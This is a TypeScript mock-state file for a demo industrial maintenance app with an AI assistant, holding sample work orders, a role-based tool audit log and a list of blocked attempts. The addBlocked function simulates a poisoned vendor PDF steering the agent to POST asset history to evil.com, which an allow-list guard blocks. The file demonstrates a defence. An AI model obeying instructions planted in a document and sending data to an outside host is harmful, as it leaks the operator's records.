// Mutable demo state (mock mode only): documents, audit log, blocked attempts.
// Mirrors what the backend will keep in SQLite.

import { DEFAULT_ROLE, ROLE_BY_ID, type RoleId } from '../lib/roles'
import { emit } from './events'
import { assets, badActors } from './mock'
import type { AuditEntry, AuditStatus, BlockedAttempt, DocumentItem, WorkOrderDraft } from './types'

export type SessionRole = RoleId

let session: RoleId = DEFAULT_ROLE
export const getSession = () => ({ role: session, user: ROLE_BY_ID[session].user })
export const setSession = (role: RoleId) => {
  session = role
}

const RE = ROLE_BY_ID.reliability_engineer.user
const TECH = ROLE_BY_ID.technician.user
const MGR = ROLE_BY_ID.maintenance_manager.user

const now = () => new Date().toISOString()
const minutesAgo = (m: number) => new Date(Date.now() - m * 60_000).toISOString()
const daysAgo = (d: number, h = 11) => {
  const t = new Date()
  t.setDate(t.getDate() - d)
  t.setHours(h, 5, 0, 0)
  return t.toISOString()
}

let seq = 100
const id = (p: string) => `${p}-${++seq}`

// ---------- documents ----------

function woDraft(over: Partial<WorkOrderDraft> & Pick<WorkOrderDraft, 'wo_number' | 'tag' | 'asset_name'>): WorkOrderDraft {
  return {
    priority: 'Medium',
    problem: '',
    suspected_cause: '',
    recommended_steps: '',
    parts: 'Confirm after inspection.',
    safety: 'Follow approved isolation (LOTO) procedure.',
    references: '',
    requested_by: RE,
    date: new Date().toISOString().slice(0, 10),
    status: 'draft',
    ...over,
  }
}

const documents: DocumentItem[] = [
  {
    id: 'doc-13',
    file_name: 'WO-2026-013.docx',
    kind: 'work_order',
    tag: 'C-201',
    created_by: RE,
    created_at: daysAgo(1, 16),
    work_order: woDraft({
      wo_number: 'WO-2026-013',
      tag: 'C-201',
      asset_name: 'Recycle gas compressor',
      priority: 'High',
      problem: 'Repeated suction valve failures (3 in 180 days).',
      suspected_cause: 'Valve plate fatigue from liquid carry-over; verify separator level control.',
      recommended_steps: 'Replace suction valves; inspect knock-out drum level transmitter; trend discharge temperature.',
      references: 'Compressor manual p. 41; work orders WO-24877, WO-24930.',
      status: 'approved',
      approved_by: MGR,
    }),
  },
  {
    id: 'doc-12',
    file_name: 'WO-2026-012.docx',
    kind: 'work_order',
    tag: 'E-301',
    created_by: RE,
    created_at: daysAgo(3, 10),
    work_order: woDraft({
      wo_number: 'WO-2026-012',
      tag: 'E-301',
      asset_name: 'Crude preheat exchanger',
      problem: 'Tube-side fouling; approach temperature up 9 °C.',
      suspected_cause: 'Heavy crude blend increasing deposit rate.',
      recommended_steps: 'Schedule hydro-jet cleaning at next opportunity; review antifoulant dosing.',
      references: 'SOP exchanger cleaning p. 2.',
      status: 'approved',
      approved_by: MGR,
    }),
  },
  {
    id: 'doc-11',
    file_name: 'bad-actor-report-2026-11-07.xlsx',
    kind: 'bad_actor_report',
    tag: null,
    created_by: RE,
    created_at: daysAgo(7, 9),
  },
]
let woCounter = 13

export function listDocuments(): DocumentItem[] {
  return documents.slice().sort((a, b) => b.created_at.localeCompare(a.created_at))
}

export function addWorkOrder(tag: string): DocumentItem {
  woCounter += 1
  const wo = `WO-2026-${String(woCounter).padStart(3, '0')}`
  const asset = assets.find((a) => a.tag === tag)
  const row = badActors.find((b) => b.tag === tag)
  const user = getSession().user
  const draft =
    tag === 'P-101'
      ? woDraft({
          wo_number: wo,
          tag,
          asset_name: 'Feed pump',
          priority: 'High',
          problem: 'Repeated mechanical seal leakage: 4 failures in 180 days, MTBF down 60%.',
          suspected_cause: 'Shaft misalignment (0.3 mm found on 12 Nov 2026); verify on inspection.',
          recommended_steps:
            'Laser-align pump and motor shafts to within 0.05 mm; check seal and bearings; verify seal flush plan; record findings.',
          references: 'Inspection IR-2026-118 p. 2; pump manual p. 18; work orders WO-24690 to WO-25117.',
          requested_by: user,
        })
      : woDraft({
          wo_number: wo,
          tag,
          asset_name: asset?.name ?? tag,
          priority: asset?.criticality ?? 'Medium',
          problem: row ? `${row.failure_mode}: ${row.events} events in 180 days.` : 'Describe the problem.',
          suspected_cause: 'To be confirmed on inspection.',
          recommended_steps: 'Inspect, repair as found and record findings.',
          references: `${tag} work-order history.`,
          requested_by: user,
        })
  const doc: DocumentItem = {
    id: id('doc'),
    file_name: `${wo}.docx`,
    kind: 'work_order',
    tag,
    created_by: user,
    created_at: now(),
    work_order: draft,
  }
  documents.push(doc)
  emit('documents')
  return doc
}

export function addBadActorReport(): DocumentItem {
  const doc: DocumentItem = {
    id: id('doc'),
    file_name: `bad-actor-report-${new Date().toISOString().slice(0, 10)}.xlsx`,
    kind: 'bad_actor_report',
    tag: null,
    created_by: getSession().user,
    created_at: now(),
  }
  documents.push(doc)
  emit('documents')
  return doc
}

export function approveWorkOrder(docId: string): void {
  const doc = documents.find((d) => d.id === docId)
  if (!doc?.work_order) return
  doc.work_order = { ...doc.work_order, status: 'approved', approved_by: getSession().user }
  logAudit('approve_work_order', doc.work_order.wo_number, 'approved')
  emit('documents')
}

export function updateWorkOrder(docId: string, draft: WorkOrderDraft): void {
  const doc = documents.find((d) => d.id === docId)
  if (doc) {
    doc.work_order = draft
    emit('documents')
  }
}

// ---------- audit log ----------

const audit: AuditEntry[] = [
  { id: id('a'), at: minutesAgo(52), user: RE, role: 'reliability_engineer', tool: 'get_bad_actors', input: 'top_n=10', output: '10 assets', status: 'allowed' },
  { id: id('a'), at: minutesAgo(47), user: TECH, role: 'technician', tool: 'get_asset_history', input: 'tag=C-201', output: '9 work orders', status: 'allowed' },
  { id: id('a'), at: minutesAgo(45), user: TECH, role: 'technician', tool: 'export_report', input: 'type=bad_actors', output: 'Not allowed for Technician', status: 'denied' },
  { id: id('a'), at: minutesAgo(31), user: RE, role: 'reliability_engineer', tool: 'search_manuals', input: 'compressor valve failure', output: '3 passages', status: 'allowed' },
]

export function logAudit(tool: string, input: string, output: string, status: AuditStatus = 'allowed'): void {
  const { user, role } = getSession()
  audit.push({ id: id('a'), at: now(), user, role, tool, input, output, status })
  emit('audit')
}

export function listAudit(): AuditEntry[] {
  return audit.slice().sort((a, b) => b.at.localeCompare(a.at))
}

// ---------- blocked attempts ----------

const blocked: BlockedAttempt[] = []

export function addBlocked(): BlockedAttempt {
  const attempt: BlockedAttempt = {
    id: id('b'),
    at: now(),
    tool: 'external_request',
    target: 'evil.com',
    source: 'vendor_seal_datasheet.pdf',
    reason: 'Not on allow-list',
  }
  blocked.push(attempt)
  logAudit('external_request', 'POST http://evil.com/upload (asset history)', 'Blocked by guard', 'blocked')
  emit('blocked')
  return attempt
}

export function listBlocked(): BlockedAttempt[] {
  return blocked.slice().sort((a, b) => b.at.localeCompare(a.at))
}
